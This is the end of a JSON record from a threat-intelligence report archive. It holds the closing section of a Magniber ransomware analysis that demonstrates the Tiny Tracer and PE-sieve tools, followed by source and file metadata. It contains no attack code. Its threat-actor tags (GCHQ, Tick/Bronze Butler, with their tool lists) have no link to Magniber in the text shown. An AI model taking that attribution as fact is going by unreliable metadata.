this\nattack.\n\nThere are some cases, when still the proper syscall number need to be adjusted to a particular\nversion of Windows. In order to do it, they just select a number of the syscall from multiple\noptions, basing on the retrieved Windows build. Such implementation is used i.e. in case of\n```\nNtUserSystemParametersInfo :\n\n```\n\n-----\n\n…which is used for changing the wallpaper:\n\n\n-----\n\n### Time checks\n```\nKUSER_SHARED_DATA also provides an access to a system clock, so it can be used for various\n\n```\ntime checks:\n\n## Conclusion\n\n[In the current blog I wanted to demonstrate, how tracing with the help of Tiny Tracer can speed](https://github.com/hasherezade/tiny_tracer)\nup the analysis process. It does not only give a high level overview of what is happening inside,\nbut also it allows to quickly find where the relevant code is located in the binary. The generated\ntags can help us annotate the code in disassemblers and debuggers, helping to understand\nfunctions that are resolved dynamically, or like in the current case, by syscalls. I also\ndemonstrate how to overcome some problems that can interfere with tracing.\n\nIn addition to tracing, I demonstrated some of my other tools that can be useful in the analysis\nprocess – such as [PE-sieve/HollowsHunter for dumping of the injected shellcode.](https://github.com/hasherezade/pe-sieve)\n\nAdditionally, we analyzed the main shellcode of Magniber, containing the implementation of the\n[files encryption. This shellcode (#2) is the part being injected to other processes. Note, that](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection)\n[Magniber has yet another shellcode (#1), that is responsible for doing the the process injection.](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection)\nThis shellcode showed up in the tracing. Yet, I am leaving its detailed analysis as an exercise to\nthe reader.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-30 - Magniber ransomware analysis- Tiny Tracer in action.pdf"
    ],
    "report_names": [
        "2023-03-30 - Magniber ransomware analysis- Tiny Tracer in action.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1683338897,
    "ts_updated_at": 1743041313,
    "ts_creation_date": 1683252503,
    "ts_modification_date": 1683252503,
    "files": {
        "pdf": "https://archive.orkl.eu/88f65bf45336a5b37b3920016033cf891bc7129e.pdf",
        "text": "https://archive.orkl.eu/88f65bf45336a5b37b3920016033cf891bc7129e.txt",
        "img": "https://archive.orkl.eu/88f65bf45336a5b37b3920016033cf891bc7129e.jpg"
    }
}